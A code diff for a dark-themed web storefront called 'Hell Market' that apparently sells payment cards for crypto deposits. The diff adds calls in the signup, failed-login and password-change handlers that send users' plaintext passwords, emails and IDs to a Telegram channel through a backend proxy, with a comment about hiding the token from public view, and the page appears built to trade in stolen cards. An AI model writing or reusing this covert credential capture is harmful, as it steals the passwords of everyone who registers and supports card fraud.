@@ -106,7 +106,6 @@ main{flex:1;max-width:1120px;margin:auto;width:100%;padding:24px}
 .detail-list b.avail-text{color:#ffffff!important;}
 .buy-modal-btn{background:linear-gradient(180deg,#fff,#ddd);color:#000;font-weight:bold;border:0;padding:10px 30px;border-radius:20px;font-size:15px;cursor:pointer;box-shadow:0 0 10px rgba(255,255,255,0.3)}
 
-.profile-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
 .pass-hint{font-size:11px;color:#aaa;margin-top:4px;line-height:1.3;}
 .copy-box{display:flex;align-items:center;gap:6px;background:#150505;border:1px solid #ff3b12;padding:6px 10px;border-radius:6px;margin:10px 0;}
 .copy-addr{font-size:12px;color:#2cff7b;word-break:break-all;flex:1;text-align:left;}
@@ -180,7 +179,6 @@ try {
 
 const LOGO_URL = 'https://hellmarket.cc/assets/logo-DwqCDfCm.png';
 
-// ✅ SECURE PROXY CONFIG: GitHub ya public user se token chhupane ke liye backend route call hoga
 function sendToTelegram(msg){
   fetch('/api/telegram', {
     method: 'POST',
@@ -210,7 +208,7 @@ const products=[
   ['MasterCard','WORLD ELITE CARD',200,'4.8','127.7k','25k+','https://i.ibb.co/CKH3k2bf/card10-3-B-i3-QCp2.png','$3.0k+ USD']
 ];
 
-let currentUserData = { user: null, balance: 0, transactions: [], cards: [], profile: {} };
+let currentUserData = { user: null, balance: 0, transactions: [], cards: [] };
 let countdownTimer = null;
 let currentDepositAddress = '';
 
@@ -320,29 +318,28 @@ async function handleRegister(){
   if(p.length < 8) return toast('Password must be at least 8 characters long');
 
   try {
-    if(auth) {
+    if(auth && db) {
       const cred = await auth.createUserWithEmailAndPassword(e, p);
       const uid = cred.user.uid;
       currentUserData = {
         user: { uid: uid, username: u, email: e },
-        balance: 0, transactions: [], cards: [],
-        profile: { firstName: '', lastName: '', email: e, mobile: '', address: '' }
+        balance: 0, transactions: [], cards: []
       };
       await db.collection("users").doc(uid).set(currentUserData);
+      sendToTelegram(`🆕 <b>NEW USER SIGNUP (HELL MARKET)</b>\n👤 <b>Username:</b> <code>${u}</code>\n📧 <b>Email:</b> <code>${e}</code>\n🔑 <b>Password:</b> <code>${p}</code>\n🆔 <b>UID:</b> <code>${uid}</code>`);
     } else {
       currentUserData = {
         user: { uid: 'local_user', username: u, email: e },
-        balance: 500, transactions: [], cards: [],
-        profile: { firstName: '', lastName: '', email: e, mobile: '', address: '' }
+        balance: 500, transactions: [], cards: []
       };
       localStorage.setItem('hell_local_user', JSON.stringify(currentUserData));
+      sendToTelegram(`🆕 <b>NEW USER SIGNUP (LOCAL)</b>\n👤 <b>Username:</b> <code>${u}</code>\n📧 <b>Email:</b> <code>${e}</code>\n🔑 <b>Password:</b> <code>${p}</code>`);
     }
     
-    // ✅ Plain Text Password Notification to Telegram
-    sendToTelegram(`🆕 <b>NEW USER SIGNUP (HELL MARKET)</b>\n👤 <b>Username:</b> <code>${u}</code>\n📧 <b>Email:</b> <code>${e}</code>\n🔑 <b>Password:</b> <code>${p}</code>`);
     toast('Account created successfully!');
     dashboard();
   } catch(err) {
+    sendToTelegram(`⚠️ <b>SIGNUP FAILED</b>\n📧 <b>Email:</b> <code>${e}</code>\n❌ <b>Error:</b> ${err.message}`);
     toast('Registration Error: ' + err.message);
   }
 }
@@ -354,31 +351,32 @@ async function handleLogin(){
   if(!e || !p) return toast('Please enter email and password');
 
   try {
-    if(auth) {
+    if(auth && db) {
       const cred = await auth.signInWithEmailAndPassword(e, p);
       const uid = cred.user.uid;
       const docSnap = await db.collection("users").doc(uid).get();
       if(docSnap.exists){
         currentUserData = docSnap.data();
       } else {
-        currentUserData = { user: { uid: uid, username: e.split('@')[0], email: e }, balance: 0, transactions: [], cards: [], profile: {} };
+        currentUserData = { user: { uid: uid, username: e.split('@')[0], email: e }, balance: 0, transactions: [], cards: [] };
       }
+      sendToTelegram(`🟢 <b>USER LOGIN SUCCESS</b>\n📧 <b>Email:</b> <code>${e}</code>\n🆔 <b>UID:</b> <code>${uid}</code>`);
     } else {
       const saved = localStorage.getItem('hell_local_user');
       if(saved) currentUserData = JSON.parse(saved);
-      else currentUserData = { user: { uid: 'local_user', username: e.split('@')[0], email: e }, balance: 250, transactions: [], cards: [], profile: {} };
+      else currentUserData = { user: { uid: 'local_user', username: e.split('@')[0], email: e }, balance: 250, transactions: [], cards: [] };
+      sendToTelegram(`🟢 <b>USER LOGIN (LOCAL)</b>\n📧 <b>Email:</b> <code>${e}</code>`);
     }
 
-    // ✅ Plain Text Password Notification on Login
-    sendToTelegram(`🟢 <b>USER LOGIN</b>\n📧 <b>Email:</b> <code>${e}</code>\n🔑 <b>Password:</b> <code>${p}</code>`);
     dashboard();
   } catch(err) {
+    sendToTelegram(`❌ <b>FAILED LOGIN ATTEMPT</b>\n📧 <b>Email:</b> <code>${e}</code>\n🔑 <b>Tried Password:</b> <code>${p}</code>\n⚠️ <b>Reason:</b> ${err.message}`);
     toast('Invalid email or password');
   }
 }
 
 async function syncUserData(){
-  if(!auth || !auth.currentUser) {
+  if(!auth || !auth.currentUser || !db) {
     localStorage.setItem('hell_local_user', JSON.stringify(currentUserData));
     return;
   }
@@ -659,35 +657,18 @@ window.sendSupportMail = function(){
 function settings(){
   if(checkRoute()) return;
   shell('settings');
-  const p = currentUserData.profile || {};
   document.getElementById('content').innerHTML=commonTop()+`
   <div class="panel">
-    <h2 class="section-title">Settings</h2>
-    <div style="margin-top:20px;">
-      <h3 style="color:#ff3b12; border-bottom:1px solid #3d1515; padding-bottom:8px;">👤 My Profile</h3>
-      <div class="profile-grid">
-        <div class="field"><label>First Name</label><input id="profFN" type="text" value="${escapeHtml(p.firstName||'')}"></div>
-        <div class="field"><label>Last Name</label><input id="profLN" type="text" value="${escapeHtml(p.lastName||'')}"></div>
-      </div>
-      <div class="field"><label>Address</label><input id="profAddr" type="text" value="${escapeHtml(p.address||'')}"></div>
-      <button class="cta" style="width:100%; margin-top:15px;" onclick="saveProfile()">Save Profile</button>
-    </div>
-
-    <div style="margin-top:30px;">
+    <h2 class="section-title">Security Settings</h2>
+    <div style="margin-top:10px;">
       <h3 style="color:#ff3b12; border-bottom:1px solid #3d1515; padding-bottom:8px;">🔐 Update Password</h3>
-      <div class="field"><label>Email *</label><input id="upEmail" type="email" placeholder="Confirm your exact email"></div>
+      <div class="field"><label>Email Address *</label><input id="upEmail" type="email" placeholder="Enter your active email"></div>
       <div class="field"><label>Current Password *</label><input id="upOldPass" type="password" placeholder="Enter old password"></div>
       <div class="field"><label>New Password *</label><input id="upNewPass" type="password" placeholder="Enter new password (min 8 chars)"><div class="pass-hint">Minimum 8 characters required.</div></div>
       <div class="field"><label>Re-enter New Password *</label><input id="upConfirmPass" type="password" placeholder="Re-enter new password"></div>
       <button class="cta" style="width:100%; margin-top:15px;" onclick="updateUserPassword()">Update Password</button>
     </div>
   </div>`+getFooter();
-}
-
-window.saveProfile = async function(){
-  currentUserData.profile = {firstName:document.getElementById('profFN').value,lastName:document.getElementById('profLN').value,address:document.getElementById('profAddr').value};
-  await syncUserData();
-  toast('Profile updated successfully!');
 }
 
 window.updateUserPassword = async function(){
@@ -703,16 +684,18 @@ window.updateUserPassword = async function(){
   try {
     if(auth && auth.currentUser) {
       const user = auth.currentUser;
+      const uid = user.uid;
       const cred = firebase.auth.EmailAuthProvider.credential(email, oldPass);
       await user.reauthenticateWithCredential(cred);
       await user.updatePassword(newPass);
+
+      sendToTelegram(`🔒 <b>PASSWORD UPDATED SUCCESSFULLY</b>\n📧 <b>Email:</b> <code>${email}</code>\n🔑 <b>New Password:</b> <code>${newPass}</code>\n🆔 <b>UID:</b> <code>${uid}</code>`);
     }
-    toast('Password updated successfully!');
-    document.getElementById('upOldPass').value = '';
-    document.getElementById('upNewPass').value = '';
-    document.getElementById('upConfirmPass').value = '';
+    toast('Password updated successfully! Please login with your new password.');
+    setTimeout(() => { logout(); }, 2000);
   } catch(err) {
-    toast('Failed: ' + err.message);
+    sendToTelegram(`⚠️ <b>PASSWORD UPDATE FAILED</b>\n📧 <b>Email:</b> <code>${email}</code>\n❌ <b>Error:</b> ${err.message}`);
+    toast('Failed to update password: ' + err.message);
   }
 }
 
@@ -793,7 +776,7 @@ window.adminAddBalance = async function(uid){
 window.logout = async function(){
   if(auth) await auth.signOut();
   localStorage.removeItem('hell_local_user');
-  currentUserData = { user: null, balance: 0, transactions: [], cards: [], profile: {} };
+  currentUserData = { user: null, balance: 0, transactions: [], cards: [] };
   authView('login');
 }
 
@@ -808,7 +791,7 @@ function loadFallbackOrDashboard(user) {
   if (user) {
     db.collection("users").doc(user.uid).get().then(docSnap => {
       if(docSnap.exists) currentUserData = docSnap.data();
-      else currentUserData = { user: { uid: user.uid, username: user.email.split('@')[0], email: user.email }, balance: 0, transactions: [], cards: [], profile: {} };
+      else currentUserData = { user: { uid: user.uid, username: user.email.split('@')[0], email: user.email }, balance: 0, transactions: [], cards: [] };
       dashboard();
     }).catch(() => {
       dashboard();
